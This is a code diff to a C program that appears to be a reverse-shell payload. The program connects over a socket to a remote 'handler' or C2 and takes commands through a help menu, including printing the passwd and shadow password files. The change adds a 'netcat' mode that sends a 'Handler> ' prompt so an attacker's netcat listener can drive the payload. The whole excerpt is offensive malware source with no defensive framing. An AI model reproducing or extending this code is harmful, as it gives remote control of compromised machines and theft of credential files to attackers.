@@ -65,9 +65,6 @@ int main(int argc, char *argv[])
 
     int sock;
 
-
-
-
 	sock = socket(AF_INET, SOCK_STREAM, 0);	//sets up our socket descripter
 
 	//printf("Socket descripter value: %d\n", sock); //this is some file descriptor testing
@@ -89,7 +86,6 @@ int main(int argc, char *argv[])
 		write(sock, buff, strlen(buff));
 		//now we will start getting into the gritty stuff
 
-
 		int check = 1;	//this will be a prompt for handler
 
 		//THE FOLLOWING WILL BE THE ALLOCATION AND WRITE TO HELP MENU FOR THE MAIN PAYLOAD
@@ -108,17 +104,23 @@ int main(int argc, char *argv[])
 		strcpy(help[11], "passwd - print the passwd file to screen\n");
 		strcpy(help[12], "shadow - attempt to print the shadow password to the screen\n");
 		strcpy(help[13], "clear - clear the current screen\n");
-		strcpy(help[14], "exit - quit from payload\n");
-		strcpy(help[15], "\n------------------------------\n\n");
+		strcpy(help[14], "netcat - setup payload to use netcat listening functionality\n");
+		strcpy(help[15], "exit - quit from payload\n");
+		strcpy(help[16], "\n------------------------------\n\n");
 		//HELP MENU INFO OVER HERE
 
+		char *line	= "Handler> ";
 		char *error = "COMMAND NOT RECOGNIZED\n";
 		char nl[3]	= "\n";
 		char termi	= '\0';
 		char num[32];
+		int netcat	= 0;
 
 		while(check)
 		{
+
+			if(netcat)
+				write(sock, line, strlen(line));
 			for(int i = 0; i < 2048; i++)
 				command[i] = 0;	//reset command to nulls so that no past command is left over
 
@@ -150,7 +152,7 @@ int main(int argc, char *argv[])
 			}
 
 			else if(!strcmp("help", command))
-				for(int i = 0; i < 16; i++)
+				for(int i = 0; i < 17; i++)
 					write(sock, help[i], strlen(help[i]));	//write help menu
 
 			else if(!strcmp("ls", command))
@@ -183,6 +185,9 @@ int main(int argc, char *argv[])
 
 			else if(!strcmp("clear", command))	//clears the C2 screen
 				system("clear");
+
+			else if(!strcmp("netcat", command)) //sets up payload for NetCat Functionality
+				netcat = 1;
 
 			else if(!strcmp("", command))		//do nothing on empty command
 				system("clear");
